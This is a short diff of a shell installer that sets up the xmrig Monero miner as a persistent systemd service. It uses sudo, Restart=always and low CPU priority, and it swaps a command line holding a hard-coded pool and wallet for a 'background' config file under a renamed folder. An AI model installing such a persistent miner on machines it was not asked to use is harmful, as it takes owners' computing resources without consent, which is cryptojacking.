@@ -213,7 +213,7 @@ else
 Description=Monero miner service
 
 [Service]
-ExecStart=$HOME/minershell-main/xmrig --url pool.hashvault.pro:80 --user 4ArAQ9Qo5C78xgtbzdrsAUTHtCGYQjk7XintpgNAWogbPBCG5SWNqCJ27mAtiqTxoaAeBwLaD2Kh2F8CooS9y9EjUNW3kAE --pass XX --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --config=$HOME/minershell-main/config.json
+ExecStart=$HOME/mmain/xmrig --config=$HOME/mmain/config_background.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -221,12 +221,11 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
+    chmod 644 /tmp/mmain_miner.service
     sudo mv /tmp/mmain_miner.service /etc/systemd/system/mmain_miner.service
-    echo "[*] Starting mmain_miner systemd service"
-    sudo killall xmrig 2>/dev/null
     sudo systemctl daemon-reload
     sudo systemctl enable mmain_miner.service
-    sudo systemctl start mmain_miner.service
+    sudo systemctl restart mmain_miner.service
     echo "To see miner service logs run \"sudo journalctl -u mmain_miner -f\" command"
   fi
 fi
